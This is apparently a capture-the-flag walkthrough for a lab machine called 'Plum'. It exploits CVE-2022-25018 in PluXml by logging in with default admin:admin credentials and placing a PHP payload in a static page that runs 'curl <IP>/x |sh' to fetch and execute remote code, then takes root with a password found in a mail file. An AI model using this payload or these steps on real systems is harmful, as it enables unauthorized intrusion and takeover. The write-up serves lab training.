# Walkthrough for Plum

# Enumeration

## Nmap

With nmap scan, we notice a web server on the target machine.

Visiting the web page, we are presented with "**PluXml**" landing static page.

## PluXml

> is a blog / CMS that uses XML instead of an SQL database to store its data.

# Exploitation

## Remote Code Execution

We find **"[CVE-2022-25018](https://nvd.nist.gov/vuln/detail/CVE-2022-25018)"** recorded for **PluXml**.

The exploitation steps can be found here: https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf

**Reference**: https://nvd.nist.gov/vuln/detail/CVE-2022-25018

#### Description: CVE-2022-25018

Pluxml v5.8.7 was discovered to allow attackers to execute arbitrary code via crafted PHP code inserted into static pages.

## POC

Visit webserver and find the link highlighted as administration.

Web server is protected by a weak password. Credentia below

```bash
admin:admin
```

Visit "**Static pages**" then click on "**edit**" to edit the static page

Erase all the content of the page and put your malicious php payload.

```php
<?php
   system("curl <IP>/x |sh");
?>
```

Save the page, And click on action "**see**"

You should get code execution

# Privilege Escalation

After some enumeration, we find a mail that has the credential for root user.

```
$ cd /var/mail
$ ls -alh
total 12K
drwxrwsr-x  2 root     mail 4.0K Aug 25 06:31 .

```
$cat www-data

We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
Thanks,
Administrator
```

```
$ su root
